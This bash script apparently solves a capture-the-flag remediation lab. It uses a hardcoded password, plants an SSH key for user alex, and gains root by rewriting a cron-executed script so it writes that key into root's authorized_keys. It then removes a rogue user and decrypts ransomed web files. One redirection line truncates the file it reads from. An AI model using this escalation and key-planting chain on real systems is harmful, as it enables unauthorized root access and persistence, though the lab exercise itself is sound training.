IP=$1

ssh_alex="/usr/bin/ssh alex@$IP"
ssh_root="/usr/bin/ssh root@$IP"
web_dir="/usr/local/apache2/htdocs/"

# FLAG 0: remove while loop from .bashrc
# this will prompt for passwd
echo '[+] Removing while loop in alex .bashrc file. Insert alex password: madeline'
$ssh_alex "head -n -1 /home/alex/.bashrc > /home/alex/.bashrc; mkdir /home/alex/.ssh"

echo '[+] Generating new SSH key in /tmp/id_rsa'
/usr/bin/ssh-keygen -f /tmp/id_rsa -N ""
priv_key="/tmp/id_rsa"
pub_key=$(cat /tmp/id_rsa.pub)

# add generated pub key to alex authorized_keys
echo '[+] Adding SSH key to alex authorized keys file'
$ssh_alex "echo '$pub_key' >> /home/alex/.ssh/authorized_keys; chmod 644 /home/alex/.ssh/authorized_keys"

# PoC that it worked
echo '[+] Running whoami as alex'
echo '[+] If pwd is not required, then SSH key has been added'
$ssh_alex -i $priv_key "whoami"

# FLAG 1: rewrite brilliant_script.sh
# FLAG 3: remove rogue ssh key
echo '[+] Insertig pub key in root authorized keys using privileged script'
$ssh_alex -i $priv_key "echo 'echo \"$pub_key\" > /root/.ssh/authorized_keys' > /opt/brilliant_script.sh"

echo '[+] Sleeping 31 sec to give time to crontab to execute'
sleep 31

echo '[+] Running whoami as root'
echo '[+] If pwd is not required, then SSH key has been added'
$ssh_root -i $priv_key "whoami"

# FLAG 2
echo '[+] Reestrablishing liblogging.so'
$ssh_root -i $priv_key "mv /lib/x86_64-linux-gnu/oldliblogging.so /lib/x86_64-linux-gnu/liblogging.so"

echo '[+] Lowering rogue user security permissions'
$ssh_root -i $priv_key "head -n -1 /etc/passwd > /tmp/passwd && cat /tmp/passwd > /etc/passwd && echo 'security:x:1001:1001::/home/security:/bin/sh' >> /etc/passwd"

# FLAG 4
echo '[+] Deleting rogue user security'
$ssh_root -i $priv_key "userdel security"

echo '[+] Retrieving files to decrypt'
/usr/bin/scp -r -i $priv_key root@$IP:/usr/local/apache2/htdocs/ /tmp/
echo '[+] Encrypted files saved in /tmp/htdocs/'

echo '[+] Retrieving decryption key...'
key=$($ssh_root -i $priv_key "cat /opt/.fixutil/backup.txt")

mkdir /tmp/decrypted

echo '[+] Decrypting files'
python3 decry.py /tmp/htdocs/index.html $key /tmp/decrypted/index.html
python3 decry.py /tmp/htdocs/reallyimportant.txt $key /tmp/decrypted/reallyimportant.txt
python3 decry.py /tmp/htdocs/todo.html $key /tmp/decrypted/todo.html
echo '[+] Files decrypted and saved in /tmp/decrypted/'

# FLAG 5
echo '[+] Reestablishing encrypted files in /usr/local/apache2/htdocs'
/usr/bin/scp -i $priv_key /tmp/decrypted/* root@$IP:/usr/local/apache2/htdocs/

echo '[+] Recovering flags'
curl -s http://$IP:1337 | grep THM | sed -E 's/<.|p|>//g'

